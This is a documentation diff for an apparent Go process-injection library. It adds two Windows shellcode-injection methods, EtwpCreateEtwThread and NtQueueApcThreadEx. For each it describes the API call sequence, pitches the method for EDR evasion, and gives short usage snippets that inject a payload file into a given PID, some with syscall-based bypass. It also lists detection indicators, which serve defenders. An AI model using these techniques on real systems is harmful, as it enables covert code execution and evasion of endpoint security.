@@ -33,6 +33,8 @@ optional EDR bypass via direct/indirect syscalls on Windows.
   - [RtlCreateUserThread (rtl)](#rtlcreateuserthread-rtl)
   - [DirectSyscall (syscall)](#directsyscall-syscall)
   - [CreateFiber (fiber)](#createfiber-fiber)
+  - [EtwpCreateEtwThread (etwthr)](#etwpcreateetwthread-etwthr)
+  - [NtQueueApcThreadEx (apcex)](#ntqueueapcthreadex-apcex)
 - [Linux Methods](#linux-methods)
   - [Ptrace (ptrace)](#ptrace-ptrace)
   - [MemFD (memfd)](#memfd-memfd)
@@ -99,6 +101,8 @@ with `SyscallMethod` set to `MethodDirect` or `MethodIndirect`).
 | RtlCreateUserThread | `MethodRtlCreateUserThread` (`"rtl"`) | Windows | Yes (PID) | Yes | T1055.002 |
 | Direct Syscall | `MethodDirectSyscall` (`"syscall"`) | Windows | No (self) | N/A (deprecated) | T1106 |
 | CreateFiber | `MethodCreateFiber` (`"fiber"`) | Windows | No (self) | Yes | T1055.013 |
+| EtwpCreateEtwThread | `MethodEtwpCreateEtwThread` (`"etwthr"`) | Windows | No (self) | Yes | T1055 |
+| NtQueueApcThreadEx | `MethodNtQueueApcThreadEx` (`"apcex"`) | Windows | Yes (PID) | Yes | T1055 |
 | Ptrace | `MethodPtrace` (`"ptrace"`) | Linux x64 | Yes (PID) | N/A | T1055.008 |
 | MemFD | `MethodMemFD` (`"memfd"`) | Linux x64 | No (fork) | N/A | T1620 |
 | ProcMem (mmap) | `MethodProcMem` (`"procmem"`) | Linux x64 | No (self) | N/A | T1055 |
@@ -123,6 +127,8 @@ inject.MethodThreadHijack        // "threadhijack"
 inject.MethodRtlCreateUserThread // "rtl"
 inject.MethodDirectSyscall       // "syscall"
 inject.MethodCreateFiber         // "fiber"
+inject.MethodEtwpCreateEtwThread // "etwthr"
+inject.MethodNtQueueApcThreadEx  // "apcex"
 
 // MethodProcessHollowing is a deprecated alias for MethodThreadHijack.
 // The implementation is Thread Execution Hijacking (T1055.003), not PE hollowing.
@@ -621,6 +627,126 @@ cfg := &inject.Config{
     Method: inject.MethodCreateFiber,
 }
 injector, _ := inject.NewInjector(cfg)
+if err := injector.Inject(shellcode); err != nil {
+    log.Fatal(err)
+}
+```
+
+---
+
+### EtwpCreateEtwThread (etwthr)
+
+**MITRE:** T1055 -- Process Injection
+
+**OS-level operation:**
+1. `VirtualAlloc` (PAGE_READWRITE) in the current process
+2. Copy shellcode into the allocated region
+3. `VirtualProtect` to PAGE_EXECUTE_READ
+4. Call `ntdll!EtwpCreateEtwThread(addr, 0)` -- an internal ETW helper that creates a thread at the given address
+
+**Why choose this method:**
+`EtwpCreateEtwThread` is an internal, undocumented function in `ntdll.dll` used by the ETW subsystem to create worker threads. Because it is not part of the standard thread creation API surface (`CreateThread`, `CreateRemoteThread`, `NtCreateThreadEx`), most EDR products do not hook or monitor it. This makes it an effective evasion technique for self-injection.
+
+**Advantages:**
+- Bypasses monitoring on standard thread creation APIs (CreateThread, NtCreateThreadEx)
+- Internal ntdll function -- not part of the documented API surface
+- Self-injection with minimal observable events
+- Full Caller support (memory allocation via NtAllocateVirtualMemory/NtProtectVirtualMemory)
+
+**Disadvantages:**
+- Internal API -- may change or be removed between Windows versions
+- Self-injection only (no cross-process variant)
+- The function name is known to some advanced EDR products
+- RW -> RX memory transition is still observable
+
+**Remote injection:** No (self only)
+**Caller support:** Yes (for memory allocation; thread creation routed through Caller on windowsSyscallInjector)
+
+**Detection characteristics:**
+- Memory scan: RW->RX transition followed by thread creation from ntdll internal function
+- Advanced EDR: monitoring of EtwpCreateEtwThread as a known evasion vector
+- Behavioral: thread start address in non-image-backed memory
+
+```go
+shellcode, _ := inject.Read("payload.bin")
+
+cfg := &inject.Config{
+    Method: inject.MethodEtwpCreateEtwThread,
+}
+injector, _ := inject.NewInjector(cfg)
+if err := injector.Inject(shellcode); err != nil {
+    log.Fatal(err)
+}
+```
+
+With Caller for EDR bypass:
+```go
+cfg := &inject.WindowsConfig{
+    Config:        inject.Config{Method: inject.MethodEtwpCreateEtwThread},
+    SyscallMethod: wsyscall.MethodIndirect,
+}
+injector, _ := inject.NewWindowsInjector(cfg)
+if err := injector.Inject(shellcode); err != nil {
+    log.Fatal(err)
+}
+```
+
+---
+
+### NtQueueApcThreadEx (apcex)
+
+**MITRE:** T1055 -- Process Injection
+
+**OS-level operation:**
+1. `OpenProcess` with `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ`
+2. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx` in the target
+3. Enumerate all threads of the target process via `CreateToolhelp32Snapshot`
+4. For each thread: `OpenThread`, call `NtQueueApcThreadEx(hThread, 1, addr, 0, 0, 0)`
+5. Flag `1` = `QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC` -- forces immediate APC delivery
+
+**Why choose this method:**
+Standard APC injection (`QueueUserAPC`) requires the target thread to enter an alertable wait state before the APC fires. `NtQueueApcThreadEx` with the `QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC` flag (available since Windows 10 1903) forces immediate APC delivery regardless of the thread's wait state. This makes APC injection significantly more reliable.
+
+**Advantages:**
+- APC fires immediately -- no alertable wait required
+- More reliable than standard QueueUserAPC
+- No new thread created in the target process
+- Full Caller support (memory + APC call routed through syscall Caller)
+
+**Disadvantages:**
+- Requires Windows 10 1903+ (the special APC flag is not available on older versions)
+- Still requires cross-process memory allocation and write
+- `NtQueueApcThreadEx` is increasingly monitored by modern EDR products
+- Requires knowing the target PID
+
+**Remote injection:** Yes (requires PID)
+**Caller support:** Yes
+
+**Detection characteristics:**
+- ETW: `NtQueueApcThreadEx` with special APC flag
+- Behavioral: cross-process APC + memory allocation pattern
+- The special APC flag usage is a known indicator of malicious activity
+
+```go
+shellcode, _ := inject.Read("payload.bin")
+
+cfg := &inject.Config{
+    Method: inject.MethodNtQueueApcThreadEx,
+    PID:    1234,
+}
+injector, _ := inject.NewInjector(cfg)
+if err := injector.Inject(shellcode); err != nil {
+    log.Fatal(err)
+}
+```
+
+With Caller for EDR bypass:
+```go
+cfg := &inject.WindowsConfig{
+    Config:        inject.Config{Method: inject.MethodNtQueueApcThreadEx, PID: 1234},
+    SyscallMethod: wsyscall.MethodDirect,
+}
+injector, _ := inject.NewWindowsInjector(cfg)
 if err := injector.Inject(shellcode); err != nil {
     log.Fatal(err)
 }
